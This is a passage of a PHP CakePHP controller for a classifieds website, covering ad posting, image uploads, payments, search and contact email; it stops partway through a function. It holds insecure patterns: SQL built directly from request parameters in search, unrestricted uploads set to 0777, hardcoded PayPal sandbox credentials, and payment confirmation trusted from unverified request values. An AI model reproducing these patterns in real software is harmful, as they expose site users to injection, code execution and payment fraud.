<?php

App::uses('AppController', 'Controller');
App::uses('CakeEmail', 'Network/Email');
App::uses('Paypal', 'Paypal.Lib');


class ClassifiedsController extends AppController {

	public $components = array('Cookie', 'Session');
    public $helpers = array('Html', 'Form',"Link","Meta");

    public function beforeFilter() {
        parent::beforeFilter();
        $this->sitemaintenance();
        //$this->Session->delete("lang_id");
        $lang_id = $this->Session->read("lang_id");
        if(empty($lang_id))
        {
        	$this->Session->write("lang_id", 1);
            $this->changelanguage();
        }
    }

    public function index()
    {
        $this->layout = "default_index";
        $main_cat_data = $this->Classified->getmaincategory();
        $premium = $this->Classified->getpremiumad();
        $latest = $this->Classified->getlatestad();

        $mstr = " AND classifieds.status = 2";
        $mcat = $this->Classified->searchmaincategory($mstr);
        $maincat = array();
        $mcount = 0;
        foreach($mcat as $mc)
        {
            $maincat[$mcount]["maincat"] = $mc;
            $category = $this->Classified->getmaincat($mc["classified_maincategories"]["mm_id"]);
            $c_array = array();
            $ccount = 0;
            foreach($category as $cat)
            {
                $c_array[$ccount]["cat"] = $cat;
                $cid = (int)$cat["classified_category"]["c_id"];
                $c_array[$ccount]["subcat"] = $this->Classified->getsubcatbycid($cid);
                $ccount++;
            }
            $maincat[$mcount]["category"] = $c_array;
            $mcount++;
        }

        $this->set("maincat", $maincat);
    	$this->set("main_cat", $main_cat_data);
        $this->set("premium", $premium);
        $this->set("latest", $latest);
    }

    public function getcategorybymid()
    {
        if($this->RequestHandler->isAjax())
        {
            $data = $this->request->data;
            $m_id = (int) base64_decode($data["m_id"]);
            $category_data = $this->Classified->getcategorybymid($m_id);
            $category = "";
            foreach($category_data as $cat)
            {
                if(!empty($cat["classified_subcategory"]["c_id"]))
                {
                    $category .= '<li><a href="javascript:void(0)" class="category" omg="'.$this->webroot.$cat["files"]["base_url"].'" main="'.$cat["classified_category"]["c_id"].'" pap="'.$cat["postaddpage"]["page_name"].'">'.$cat["classified_category"]["category"].'</a></li>';
                }else{
                    $category .= '<li><a href="javascript:void(0)" class="finalstep_cat" omg="'.$this->webroot.$cat["files"]["base_url"].'" main="'.$cat["classified_category"]["c_id"].'" pap="'.$cat["postaddpage"]["page_name"].'">'.$cat["classified_category"]["category"].'</a></li>';
                }
            }
            
            $this->set('category', $category);
            $this->set('_serialize', array('category'));
            $this->response->statusCode(200);
        }
    }

    public function getsubcategorybycid()
    {
        if($this->RequestHandler->isAjax())
        {
            $data = $this->request->data;
            $c_id = (int) base64_decode($data["c_id"]);
            $subcategory_data = $this->Classified->getsubcategorybycid($c_id);
            
            $subcategory = "";
            foreach($subcategory_data as $cat)
            {
                $subcategory .= '<li><a href="javascript:void(0)" class="subcategory final_step" main="'.$cat["classified_subcategory"]["s_id"].'">'.$cat["classified_subcategory"]["subcategory"].'</a></li>';
            }
            
            $this->set('subcategory', $subcategory);
            $this->set('_serialize', array('subcategory'));
            $this->response->statusCode(200);
        }
    }

    public function postadd()
    {
        $this->loadModel("ToolTip");
        $main_cat_data = $this->Classified->getmaincategory();
        $country = $this->Classified->getcountry();
        $p_mode = $this->Classified->getpaymentmode();
        $tooltip = $this->ToolTip->find("all");
        $tip = array();
        foreach($tooltip as $tool)
        {
            $tip[$tool["ToolTip"]["id"]] = $tool["ToolTip"]["content"];
        }
        
        $user = $this->Session->read("user");
        if(!empty($user))
        {
            $state = $this->Classified->getstates($user["country"]);
            $this->set("state", $state);
        }
        $this->set("tip", $tip);
        $this->set("p_mode", $p_mode);
        $this->set("country", $country);    
        $this->set("main_cat", $main_cat_data);
    }

    public function getstates()
    {
        if($this->request->isAjax())
        {
            $c_id = $this->request->data["c_id"];
            $state = $this->Classified->getstates($c_id);
            $this->set("state",$state);
            $this->set("_serialize", array("state"));
            $this->response->statusCode(200);
        }
    }

    /* Submit ad */
    public function confirmpage()
    {   
        if($this->request->is('post'))
        {   
            $this->loadModel("User");
            $this->loadModel("Classified");
            $this->loadModel('file');
            $this->loadModel('ClassifiedImage');
            $this->loadModel('Tag');
            
            $data = $this->request->data;
            $user = $this->Session->read("user");
            $user_id;
          
            if(empty($user))
            {
                $email = $data["email"];
                $u_data = $this->User->find("first",array("conditions" => array("email" => $email)));
                if(empty($u_data))
                {
                    $u_array = array();
                    $u_array["name"] = $data["name"];
                    $u_array["email"] = $data["email"];
                    $u_array["password"] = $data["password"];
                    $u_array["confirm_password"] = $data["confirm_password"];    
                    $u_array["phone"] = $data["phone"];
                    $u_array["city"] = $data["city"];
                    $u_array["zipcode"] = $data["zipcode"];
                    $u_array["street_no"] = $data["street_no"];
                    $u_array["status"] = 2;
                    $u_array["created_date"] = date("Y-m-d H:i:s");
                    $u_array["modify_date"] = date("Y-m-d H:i:s");

                    $this->User->create();
                    $this->User->save($u_array);
                    $user_id = $this->User->getLastInsertID();
                    $hash = sha1($data["email"] . rand(0, 100));
                    $this->User->insertactivationcode($user_id
                            , $data["email"]
                            , $hash);

                    $done = $this->__sendEmailConfirm($user_id, $hash);
                    //$this->__sendAccountActivationmail($u_array);
                    $this->set("newuser","yes");
                }else
                {
                    $user_id = $u_data["User"]["id"];
                }
            }else
            {
                $user_id = $user["id"];
            }
          
            $address = $data["street_no"].' '.$data["zipcode"].' '.$data["city"].' '.$data["cont_name"];
            $loc = $this->getlatlng($address);
           
            $data["user_id"] = $user_id;
            $data["logo_id"] = 28;
            $data["lat"] = $loc["latitude"];
            $data["lng"] = $loc["longitude"];
            $data["addby"] =  0;  
            $data["status"] = 0;
            $data["create_date"] = date("Y-m-d H:i:s");
            $data["modify_date"] = date("Y-m-d H:i:s");
            $this->Classified->create();
            if($this->Classified->save($data))
            {
                $add_id = (int) $this->Classified->getLastInsertID();

                if (!empty($_FILES["logo_image"])) {
                    $img_id = array();
                    for($i = 0; $i < count($_FILES["logo_image"]["name"]); $i++)
                    {
                        if($_FILES["logo_image"]["size"][$i] > 0 )
                        {
                            $filename = $_FILES["logo_image"]["name"][$i];
                            $date = date_create();
                            $timestamp = date_timestamp_get($date);
                            $ext_array = explode(".", $filename);
                            $ext = array_pop($ext_array);
                            $newfilename = $timestamp . '_classified_add_'.$ext_array[0]."_".$i."_".$user_id."." . $ext;
                            $path = 'files/admin/classified_add/' . $newfilename;
                            $status = 2;
                            $created_on = date("Y-m-d H:i:s");
                            $file = array();
                            $file["file_name"] = $newfilename;
                            $file["base_url"] = $path;
                            $file["status"] = $status;
                            $file["created_on"] = $created_on;

                            if (move_uploaded_file($_FILES["logo_image"]["tmp_name"][$i], $path)) {
                                chmod($path, 0777);
                                $this->file->create();
                                if ($this->file->save($file)) {

                                    $lid = (int) $this->file->getLastInsertID();
                                    $img_id[] = $lid;
                                    $file_data = array();
                                    $file_data["user_id"] = $user_id;
                                    $file_data["add_id"] = $add_id;
                                    $file_data["logo_id"] = $lid;
                                    $file_data["status"] = 2;
                                    $file_data["created_date"] = date('Y-m-d h:i:s');

                                    $this->ClassifiedImage->create();
                                    $this->ClassifiedImage->save($file_data);
                                }
                                $message = "Add Posted Successfully";
                            }else
                            {
                                $message = "There is some error Add did not post successfully";  
                            }
                        }
                    }
                        if(count($img_id) > 0)
                        {
                            $this->Classified->id = $add_id;
                            $this->Classified->saveField('logo_id', $img_id[0]);
                        }
                }

                $tags = explode(",", $data["tag_name"]);
                foreach($tags as $tag)
                {
                    $t_data = $this->Tag->find("first", array("conditions" => array("tag" => $tag)));
                    if(empty($t_data))
                    {
                        $td = array();
                        $td["tag"] = $tag;
                        $td["status"] = 2;
                        $td["created_date"] = date("Y-m-d H:i:s");
                        $this->Tag->create();
                        $this->Tag->save($td);
                    }
                }

                if(!empty($data["feature"]))
                {
                    $u_amt = array();
                    $totalamt = 0; 
                    foreach($data["feature"] as $feat)
                    {
                         $name = $feat["name"];
                         $val = $data["feat"][$name];
                         $val = explode("-", $val);
                         $totalamt += $val[1];
                         $u_amt["totalamt"] = $totalamt;
                         $u_amt[$name] = 1;
                         $u_amt[$name."_date"] = date("Y-m-d", strtotime("+ $val[0]"));
                    }
                    //echo "<pre>"; print_r($u_amt); die();
                    $this->Session->write("u_amt", $u_amt);
                    $this->set("u_amt", $u_amt);
                    $this->set("data", $data);
                    $this->set("add_id", $add_id);
                    $this->render('payment');
                }else
                {
                    $this->__sendpostaddmail($data,$add_id);
                    $message = "success";
                    $this->set("add_id", $add_id);
                    $this->set("data", $data);
                }                
            }else
            {
                $message =  "fail";
            }

            $this->set("message", $message);
        }
    }

    public function getlatlng($address)
    {
        // We define our address
        //$address = 'germany 01723';
        // We get the JSON results from this request
        $loc = array();
        $loc["latitude"] = "";
        $loc["longitude"] = "";
        $geo = file_get_contents('http://maps.googleapis.com/maps/api/geocode/json?address='.urlencode($address).'&sensor=false');
        // We convert the JSON to an array
        $geo = json_decode($geo, true);
        //echo "<pre>"; print_r($geo);
        // If everything is cool
        if ($geo['status'] = 'OK') {
          // We set our values
          $loc["latitude"] = $geo['results'][0]['geometry']['location']['lat'];
          $loc["longitude"] = $geo['results'][0]['geometry']['location']['lng'];
        }
        return $loc;
    }

    /* Credit/debit card payment */
    public function payment()
    {
        if($this->request->is('post'))
        {
            $this->loadModel("Payment");
            $this->loadModel("Classified");

            $data = $this->request->data;

            $add_id = $data["add_id"];
            $title = $data["title"];
            $amount = $data["amount"];            
            $card = $data["no_card"];
            $cvv = $data["card_cvv"];
            $exp_m = $data["card_month"];
            $exp_y = $data["card_year"];
            
            $this->Paypal = new Paypal(array(
                                            'sandboxMode' => true,
                                            'nvpUsername' => 'soravgarg123-facilitator_api1.gmail.com',
                                            'nvpPassword' => 'PCYX45KMRA3CCNHS',
                                            'nvpSignature' => 'AFcWxV21C7fd0v3bYYYRCpSSRl31ArtJ7rcztV7aXbA7Eg3Lz-jtl8CL'
                                        )); 
            $payment = array(
                            'amount' => $amount,
                            'card' => $card, // This is a sandbox CC
                            'expiry' => array(
                                'M' => $exp_m,
                                'Y' => $exp_y,
                            ),
                            'cvv' => $cvv,
                            'currency' => 'EUR' // Defaults to GBP if not provided
                        );

                        try {
                            $result =  $this->Paypal->doDirectPayment($payment);
                            if($result["ACK"] == 'Success')
                            {   
                                $u_amt = $this->Session->read("u_amt");
                                $this->Session->delete("u_amt");
                                $this->Classified->id = $add_id;
                                $this->Classified->save($u_amt);
                                $user = $this->Classified->getuserdata($add_id);
                                $pmt = array();
                                $pmt["user_id"]  = $user[0]["users"]["id"];
                                $pmt["ad_id"]  = $add_id;
                                $pmt["txn_id"]  = $result['TRANSACTIONID'];
                                $pmt["amount"]  = $result['AMT'];
                                $pmt["payment_type"]  = "credit/debit card";
                                $pmt["mode"] = $result['ACK'];
                                $pmt["ipaddress"] = $_SERVER["REMOTE_ADDR"];
                                $pmt["status"]  = 2;
                                $pmt["created_date"]  = date("Y-m-d H:i:s");
                                $pmt["modify_date"] = date("Y-m-d H:i:s"); 

                                $this->Payment->create();
                                $this->Payment->save($pmt);

                                $status_array = array();
                                $status_array["add_id"] = $add_id;
                                $status_array["title"] = $title;
                                $status_array["tr_id"] = $result["TRANSACTIONID"];
                                $status_array["ack"] = $result["ACK"];
                                $status_array["amt"] = $result["AMT"];

                                $u_res = $this->__sendaddconfirmmailtouser($status_array,$user);
                                
                                $this->set('add_id',$add_id);
                                $this->set('ack',$result["ACK"]);
                                $this->set('tr_id',$result["TRANSACTIONID"]);
                                $this->set('Amount',$result["AMT"]);
                                $this->render('confirm_pay');
                                
                            }else
                            {
                                $this->set('ack',$result["ACK"]);
                                $this->set('tr_id',$result["TRANSACTIONID"]);
                                $this->set('Amount',$result["AMT"]);
                                $this->render('confirm_pay');
                            }
                            
                       } catch (Exception $e) {
                            $message = $e->getMessage();
                            $this->set('ack',$message);
                            $this->set('Amount',"");
                            $this->set('tr_id',"");
                            $this->render('confirm_pay');
                        }   
        }
    }

    /* Paypal payment */
    public function confirm_pay()
    {
        if(!empty($_REQUEST['st']))
        {
            
            if($_REQUEST['st'] == 'Completed' OR $_REQUEST['st'] == "Pending")
            {   
                $this->loadModel("Payment");
                $this->loadModel("Classified");

                $add_id = $_REQUEST['cm'];

                $u_amt = $this->Session->read("u_amt");
                $this->Session->delete("u_amt");

                $this->Classified->id = (int) $add_id;
                $this->Classified->save($u_amt);

                $status_array = array();
                $status_array["add_id"] = $add_id;
                $status_array["title"] = "";
                $status_array["tr_id"] = $_REQUEST['tx'];
                $status_array["ack"] = $_REQUEST['st'];
                $status_array["amt"] = $_REQUEST['amt'];

                $user = $this->Classified->getuserdata($add_id);
                
                $pmt = array();
                $pmt["user_id"]  = $user[0]["users"]["id"];
                $pmt["ad_id"]  = $add_id;
                $pmt["txn_id"]  = $_REQUEST['tx'];
                $pmt["amount"]  = $_REQUEST['amt'];
                $pmt["payment_type"]  = "paypal";
                $pmt["mode"] = $_REQUEST['st'];
                $pmt["ipaddress"] = $_SERVER["REMOTE_ADDR"];
                $pmt["status"]  = 2;
                $pmt["created_date"]  = date("Y-m-d H:i:s");
                $pmt["modify_date"] = date("Y-m-d H:i:s"); 

                $this->Payment->create();
                $this->Payment->save($pmt);
                
                $u_res = $this->__sendaddconfirmmailtouser($status_array,$user);
                
                $this->set('ack',$_REQUEST['st']);
                $this->set('tr_id',$_REQUEST['tx']);
                $this->set('Amount',$_REQUEST['amt']);
                $this->render('confirm_pay');
            }else
            {
                $this->set('ack',$_REQUEST['st']);
                $this->set('tr_id',$_REQUEST['tx']);
                $this->set('Amount',$_REQUEST['amt']);
                $this->render('confirm_pay');
            }  
        }
    }


    public function search($p1 = false,$p2 = false,$p3 = false, $p4 = false)
    {
        $this->layout = "default_index";
        $nrg = func_num_args();
         //echo "<pre>"; print_r($nrg); die();
        //echo $p3; die();
        $data = $this->params["url"];
        $marray = array();
        $darray = array();
        $mstr = "";
        $dstr = "";
        if(isset($data["keyword"]) && !empty($data["keyword"]))
        {   
            $marray[] = "classifieds.title LIKE '%".$data["keyword"]."%'";
            $darray[] = "classifieds.title LIKE '%".$data["keyword"]."%'";
            $darray[] = "classifieds.tag_name LIKE '%".$data["keyword"]."%'";
        }

        if(isset($data["loc"]) && !empty($data["loc"]))
        {   
            $loc = explode("-", $data["loc"]);
            if(isset($loc[1]))
            {
                $marray[] = "classifieds.city LIKE '%".$loc[1]."%'";
                $darray[] = "classifieds.city LIKE '%".$loc[1]."%'";
            }
            $marray[] = "classifieds.zipcode = '".$loc[0]."'";
            $darray[] = "classifieds.zipcode = '".$loc[0]."'";
        }
        
        if(isset($data["m_id"]) && !empty($data["m_id"]))
        {
            $darray[] = "classifieds.m_id = ".$data["m_id"];
            $data["hid_main"] = (isset($data["loc"]) && $data["loc"] != "")? $p2 : $p1;
        }

        if(isset($data["c_id"]) && !empty($data["c_id"]))
        {
            $darray[] = "classifieds.c_id = ".$data["c_id"];
            $data["hid_cat"] = (isset($data["loc"]) && $data["loc"] != "")? $p3 : $p2;
        }

        if(isset($data["s_id"]) && !empty($data["s_id"]))
        {
            $darray[] = "classifieds.s_id = ".$data["s_id"];
            $data["hid_scat"] = (isset($data["loc"]) && $data["loc"] != "")? $p4 : $p3;
        }

        if(isset($data["adt"]) && !empty($data["adt"]))
        {
            $darray[] = "classifieds.post_type = ".$data["adt"];
        }

        if(isset($data["price2"]) && !empty($data["price2"]))
        {
            $darray[] = "classifieds.price BETWEEN ".$data['price1']." AND ".$data['price2'];
        }

        if(isset($data["cond_type"]) && !empty($data["cond_type"]))
        {
            $darray[] = "classifieds.condition_type = ".$data["cond_type"];
        }

        if(isset($data["model"]) && !empty($data["model"]))
        {
            $darray[] = "classifieds.model = '".$data["model"]."'";
        }

        if(isset($data["year2"]) && !empty($data["year2"]))
        {
            $darray[] = "classifieds.year BETWEEN ".$data['year1']." AND ".$data['year2'];
        }

        if(isset($data["fuel"]) && !empty($data["fuel"]))
        {
            $fuel = base64_decode($data['fuel']);
            $darray[] = "classifieds.fuel IN (".$fuel.")";
            $fuel = ltrim($fuel,"'");
            $fuel = rtrim($fuel,"'");
            $jay = explode("','", $fuel);
            $data["fuel"] = $jay;
        }

        if(isset($data["km2"]) && !empty($data["km2"]))
        {
            $darray[] = "classifieds.kilometer BETWEEN ".$data['km1']." AND ".$data['km2'];
        }

        if(isset($data["at"]) && !empty($data["at"]))
        {
            $darray[] = "classifieds.typeofadd = ".$data["at"];
        }

        if(isset($data["fur"]) && !empty($data["fur"]))
        {
            $darray[] = "classifieds.furnished = '".$data["fur"]."'";
        }

        if(isset($data["room"]) && !empty($data["room"]))
        {
            $room = base64_decode($data['room']);
            $darray[] = "classifieds.rooms IN (".$room.")";
            $jay = explode(",", $room);
            $data["room"] = $jay;
        }

        if(isset($data["ms2"]) && !empty($data["ms2"]))
        {
            $darray[] = "classifieds.squaremeter BETWEEN ".$data['ms1']." AND ".$data['ms2'];
        }

        if(isset($data["jt"]) && !empty($data["jt"]))
        {
            $darray[] = "classifieds.job_type = ".$data["jt"];
        }

        if(isset($data["sp"]) && !empty($data["sp"]))
        {
            $sp = base64_decode($data['sp']);
            $darray[] = "classifieds.salary_period IN (".$sp.")";
            $sp = ltrim($sp,"'");
            $sp = rtrim($sp,"'");
            $jay = explode("','", $sp);
            $data["sp"] = $jay;
        }

        if(isset($data["sr1"]) && !empty($data["sr1"]))
        {
            $darray[] = "classifieds.salary_from >= ".$data["sr1"];
        }

        if(isset($data["sr2"]) && !empty($data["sr2"]))
        {
            $darray[] = "classifieds.salary_to <= ".$data["sr2"];
        }

        if(isset($data["pt"]) && !empty($data["pt"]))
        {
            $darray[] = "classifieds.position_type LIKE '%".$data["pt"]."%'";
        }

        if(isset($data["place"]) && !empty($data["place"]))
        {
            $darray[] = "classifieds.state = '".$data["place"]."'";
            $city_list = $this->Classified->getcitylist($data["place"]);
            $this->set("city_list",$city_list);
        }

        if(isset($data["city"]) && !empty($data["city"]))
        {
            $darray[] = "classifieds.city = '".$data["city"]."'";
        }

        $radius = "";
        if(isset($data["radius"]) && !empty($data["radius"]))
        {
            $radius = " HAVING distance < ".$data["radius"];
        }


        $marray[] = "classifieds.status = 2";
        $lim = configure::read("limit");

        if(!empty($data["off"]))
        {
            $old_off = (int) $data["off"];
            $offset =  $old_off * $lim;
            $off = "LIMIT ".$offset." , ".$lim;
        }else{
            $old_off = 0;
            $offset = 0;
            $off = "LIMIT ".$offset." , ".$lim;
        }

        if(!empty($marray))
        {
            $mstr = " AND ".implode(" AND ", $marray);
        }

        if(!empty($darray))
        {
            $dstr = " AND ".implode(" AND ", $darray);
        }

        $mcat = $this->Classified->searchmaincategory($mstr);
        
        if(isset($data["ad"]) && $data["ad"] == 2)
        {
            $ad1 = "";
            $ad2 = " AND classifieds.logo_id != 28";
        }else
        {   
            $ad1 = " AND classifieds.logo_id != 28";
            $ad2 = "";
            $data["ad"] = 1;
        }


        if(isset($data["order"]) && $data["order"] == 1)
        {
            $order = "ORDER BY classifieds.price ASC";
        }else if(isset($data["order"]) && $data["order"] == 2)
        {
            $order = "ORDER BY classifieds.price DESC";
        }else
        {
            $order = "ORDER BY classifieds.modify_date DESC";
        }

        $add_count = count($this->Classified->searchadds($dstr,$ad1,"","","",$radius));
        $add_count1 = count($this->Classified->searchadds($dstr,$ad2,"","","",$radius));
        
        $ua = " AND classifieds.urgent = 1 AND classifieds.urgent_date >= ".date("Y-m-d");
        //$na = " AND classifieds.urgent != 1 AND classifieds.urgent_date < ".date("Y-m-d");
        $urgentad = $this->Classified->searchadds($dstr,$ad1,$ua,$off,$order,$radius); 
        
        $normad = array();
        $ua_count = count($urgentad);
        $new_lim = $lim - $ua_count;
        if($new_lim > 0)
        {
            $new_offset = $offset + $ua_count;
            $new_off = "LIMIT ".$new_offset." , ".$new_lim;
            $normad = $this->Classified->searchadds($dstr,$ad1,"",$new_off,$order,$radius);     
        }
        
        $adddata = array_merge($urgentad,$normad);
        
        $user = $this->Session->read("user");
        if(!empty($user))
        {
            $user_id = (int) $user["id"];
            $f_data = $this->userfavorite($user_id);
            $this->set("f_data",$f_data);
        }

        $maincat = array();
        $mcount = 0;
        foreach($mcat as $mc)
        {
            $maincat[$mcount]["maincat"] = $mc;
            $category = $this->Classified->getmaincat($mc["classified_maincategories"]["mm_id"]);
            $c_array = array();
            $ccount = 0;
            foreach($category as $cat)
            {
                $c_array[$ccount]["cat"] = $cat;
                $cid = (int)$cat["classified_category"]["c_id"];
                $c_array[$ccount]["subcat"] = $this->Classified->getsubcatbycid($cid);
                $ccount++;
            }
            $maincat[$mcount]["category"] = $c_array;
            $mcount++;
        }

        //echo "<pre>"; print_r($adddata); die();
        $this->Session->delete("data");
        $this->Session->write("data",$data);
        $this->set("maincat", $maincat);
        $this->set("data", $data);
        $this->set("mcat", $mcat);
        $this->set("adddata", $adddata);
        $this->set("add_count", $add_count);
        $this->set("add_count1", $add_count1);
        $this->set('off',$old_off);
    }

    public function userads()
    {
        if($this->request->is("get"))
        {
            $id = base64_decode($this->params["url"]["id"]);
            $ad_id = base64_decode($this->params["url"]["ad_id"]);
            $userad = $this->Classified->getuserad($id,$ad_id);
            $mcat = $this->Classified->getmaincategory();
            $this->set("userad", $userad);
            $this->set("mcat", $mcat);
        }
    }

    public function getsearchcategory()
    {
        if($this->RequestHandler->isAjax())
        {
            $data = $this->request->data;
            $m_id = (int) base64_decode($data["m_id"]);
            $category_data = $this->Classified->getcategory($m_id);
            $subcat = $this->Classified->getsubcategorybymid($m_id);
            // echo "<pre>"; print_r($subcat); die();

            $this->set('category', $category_data);
            $this->set('subcat', $subcat);
            $this->set('_serialize', array('category','subcat'));
            $this->response->statusCode(200);
        }
    }
    
    public function viewdetail($ad_id = false)
    {
        if(!empty($ad_id))
        {
            $view = $this->Classified->updateadview($ad_id);
            $add_data = $this->Classified->getadddetail($ad_id);
            $add_images = $this->Classified->getaddimages($ad_id);
            if(!empty($add_data))
            {
                $add_data = $add_data[0];
            }

            $user = $this->Session->read("user");
            if(!empty($user))
            {
                $user_id = (int) $user["id"];
                $f_data = $this->userfavorite($user_id);
                $this->set("f_data",$f_data);
            }
            $this->set("add", $add_data);
            $this->set("add_images", $add_images);
            $this->set("view", $view);
        }
    }

    public function viewad($ad_id = false)
    {
        if(!empty($ad_id))
        {
            $add_data = $this->Classified->getadview($ad_id);
            $add_images = $this->Classified->getaddimages($ad_id);
            if(!empty($add_data))
            {
                $add_data = $add_data[0];
            }

            $this->set("add", $add_data);
            $this->set("add_images", $add_images);
        }
    }

    public function editadd()
    {
        if($this->request->is("get"))
        {
            $this->loadModel("Models");
            $this->loadModel("ToolTip");
            $id =  (int)base64_decode($_GET["id"]);
            $addata = $this->Classified->getadddata($id);
            $addata = $addata[0];
            $add_images = $this->Classified->getaddimages($id);
            $country = $this->Classified->getcountry();
            $p_mode = $this->Classified->getpaymentmode();

            $s_id = $addata["classifieds"]["s_id"];
            $mod = $this->Models->find("all",array("conditions" => array("s_id" => $s_id)));
            $tooltip = $this->ToolTip->find("all");
            $tip = array();
            foreach($tooltip as $tool)
            {
                $tip[$tool["ToolTip"]["id"]] = $tool["ToolTip"]["content"];
            }

            $main_cat_data = $this->Classified->getmaincategory();

            $this->set("main_cat", $main_cat_data);
            $this->set("tip", $tip);
            $this->set("model",$mod);
            $this->set("p_mode", $p_mode);
            $this->set("country", $country);    
            $this->set("add_images",$add_images);
            $this->set("add",$addata);
        }
    }

    /** Update post add  **/

    public function updatepostadd()
    {
        $this->loadModel('file');
        $this->loadModel('Tag');
        $this->loadModel('ClassifiedImage');
        $user = $this->Session->read('user');
        $user_id = (int) $user["id"];
        
        if(!empty($_POST))
        {
               
            $data = $_POST;
            $message = "Post Edited Successfully";
            $add_id = (int) $data["add_id"];
            $img_logoid = $data["img_logoid"];

            $uf = array();
            $uf["price"] = 0; $uf["price_type"] = ""; $uf["condition_type"] = 0; $uf["year"] = ""; $uf["fuel"] = ""; $uf["model"] = ""; $uf["kilometer"] = 0; $uf["typeofadd"] = 0; $uf["rent"] = ""; $uf["sale"] = ""; $uf["furnished"] = ""; $uf["rooms"] = 0; $uf["squaremeter"] = 0; $uf["post_type"] = 0; $uf["gearbox"] = ""; $uf["power"] = 0; $uf["power_unit"] = ""; $uf["mode"] = ""; $uf["job_type"] = 0; $uf["salary_period"] = ""; $uf["salary_from"] = ""; $uf["salary_to"] = ""; $uf["position_type"] = "";
            
            $this->Classified->id = $add_id;
            $this->Classified->save($uf);

            $data["modify_date"] = date('Y-m-d h:i:s');

            $this->Classified->id = $add_id;
            $this->Classified->save($data);
           
            $this->Classified->deleteaddimages($add_id);

            if (!empty($_FILES["logo_image"]))
            {
                $img_id = array();
                for($i = 0; $i < count($_FILES["logo_image"]["name"]); $i++)
                {
                    if($_FILES["logo_image"]["size"][$i] > 0 )
                    {
                        
                        $filename = $_FILES["logo_image"]["name"][$i];
                        $date = date_create();
                        $timestamp = date_timestamp_get($date);
                        $ext_array = explode(".", $filename);
                        $ext = array_pop($ext_array);
                        $newfilename = $timestamp . '_classified_add_'.$ext_array[0]."_".$i."_".$user_id."." . $ext;
                        $path = 'files/admin/classified_add/' . $newfilename;
                        $status = 2;
                        $created_on = date("Y-m-d H:i:s");
                        $file = array();
                        $file["file_name"] = $newfilename;
                        $file["base_url"] = $path;
                        $file["status"] = $status;
                        $file["created_on"] = $created_on;

                        if (move_uploaded_file($_FILES["logo_image"]["tmp_name"][$i], $path)) {
                            chmod($path, 0777);
                            $this->file->create();
                            if ($this->file->save($file)) {

                                $lid = (int) $this->file->getLastInsertID();
                                $img_id[] = $lid;
                                $file_data = array();
                                $file_data["user_id"] = $user_id;
                                $file_data["add_id"] = $add_id;
                                $file_data["logo_id"] = $lid;
                                $file_data["status"] = 2;
                                $file_data["created_date"] = date('Y-m-d h:i:s');

                                $this->ClassifiedImage->create();
                                $this->ClassifiedImage->save($file_data);                            
                            }
                            $message = "Post Edited Successfully";
                        }else{
                                $message = "There is some error Add did not post successfully";  
                             }
                    }
                }
            }else{
                $message = "Post Edited Successfully";
            }

            $new_img_logoid = substr($img_logoid, 0,-1);
            $logoid_array = explode(",", $new_img_logoid);

            if(count($logoid_array) > 0 )
            {
                $this->Classified->id = $add_id;
                $this->Classified->saveField('logo_id', $logoid_array[0]);
               
                for($j = 0; $j < count($logoid_array); $j++)
                {
                    $file_data = array();
                    $file_data["user_id"] = $user_id;
                    $file_data["add_id"] = $add_id;
                    $file_data["logo_id"] = $logoid_array[$j];
                    $file_data["status"] = 2;
                    $file_data["created_date"] = date('Y-m-d h:i:s');

                    $this->ClassifiedImage->create();
                    $this->ClassifiedImage->save($file_data);
                }
            }else{
                    $this->Classified->id = $add_id;
                    $this->Classified->saveField('logo_id', $img_id[0]);
            }

            $tags = explode(",", $data["tag_name"]);
            foreach($tags as $tag)
            {
                $t_data = $this->Tag->find("first", array("conditions" => array("tag" => $tag)));
                if(empty($t_data))
                {
                    $td = array();
                    $td["tag"] = $tag;
                    $td["status"] = 2;
                    $td["created_date"] = date("Y-m-d H:i:s");
                    $this->Tag->create();
                    $this->Tag->save($td);
                }
            }
            
            if(!empty($data["feature"]))
            {
                $u_amt = array();
                $totalamt = 0; 
                foreach($data["feature"] as $feat)
                {
                     $name = $feat["name"];
                     $val = $data["feat"][$name];
                     $val = explode("-", $val);
                     $totalamt += $val[1];
                     $u_amt["totalamt"] = $totalamt;
                     $u_amt[$name] = 1;
                     $u_amt[$name."_date"] = date("Y-m-d", strtotime("+ $val[0]"));
                }
                //echo "<pre>"; print_r($u_amt); die();
                $this->Session->write("u_amt", $u_amt);
                $this->set("u_amt", $u_amt);
                $this->set("data", $data);
                $this->set("add_id", $add_id);
                $this->render('payment');
            }else
            {
                $this->Session->setFlash($message, 'default', array(), 'good');
                return $this->redirect(array('controller' => 'users', 'action' => 'myaccount'));   
            }
        }
    }

    public function sendmailtouser()
    {
        if($this->RequestHandler->isAjax())
        {
            $data = $this->request->data;
            $femail = $data["from_email"];
            $fname = $data["from_name"];
            $fphone = $data["from_phone"];
            $temail = $data["to_email"];

            $message = $data["message"]."<br/>";
            $message .= $fname."<br/>";
            $message .= $fphone."<br/>";
            
            $subject = $data["title_email"];
            $name = $data["name_email"];
            
            $email = array();
            $email[] = $temail;
            if(isset($data["send_copy"]) && !empty($data["send_copy"]))
            {
                $email[] = $femail;
            }

            $this->loadModel("EmailTemplate");
            $edata = $this->EmailTemplate->findById(5);
            $msg = str_replace("{NAME}", $name, str_replace("{MESSAGE}",$message, $edata["EmailTemplate"]["content"]));
            $sub = str_replace("{SUBJECT}", $subject, $edata["EmailTemplate"]["subject"]);
            
            $cakeEmail = new CakeEmail();
            $cakeEmail->template('default','defaultmail')
                    ->emailFormat('html')
                    ->from(array( $femail => 'Classified'))
                    ->to($email)
                    ->subject($sub)
                    ->viewVars(array('content' => $msg));
            return $cakeEmail->send();
            
            $this->set("message", "success");
            $this->set("_serialize",array("message"));
            $this->response->statusCode(200);
        }
    }

    public function sendrecommendmail()
    {
        if($this->RequestHandler->isAjax())
        {
            $data = $this->request->data;
            $to_email = $data["to_email"]; 
            $from_email = $data["from_email"];
            $from_name = $data["from_name"];
            $ad_id = $data["ad_id"];
            $link = '<a href="http://' . env('SERVER_NAME') . '/classifieds/viewdetail/'.$ad_id.'" >View Ad</a>';

            $this->loadModel("EmailTemplate");
            $edata = $this->EmailTemplate->findById(6);
            $sub = str_replace("{FROMNAME}",$from_name , $edata["EmailTemplate"]["subject"]);
            $msg = str_replace("{FROMNAME}", $from_name, str_replace("{LINK}", $link, str_replace("{MESSAGE}", $data["message"], $edata["EmailTemplate"]["content"])));
            
            $cakeEmail = new CakeEmail();
            $cakeEmail->template('default','defaultmail')
                    ->emailFormat('html')
                    ->from(array( $from_email => 'Classified'))
                    ->to($to_email)
                    ->subject($sub)
                    ->viewVars(array('content' => $msg));
            return $cakeEmail->send();

            $this->set("message", "success");
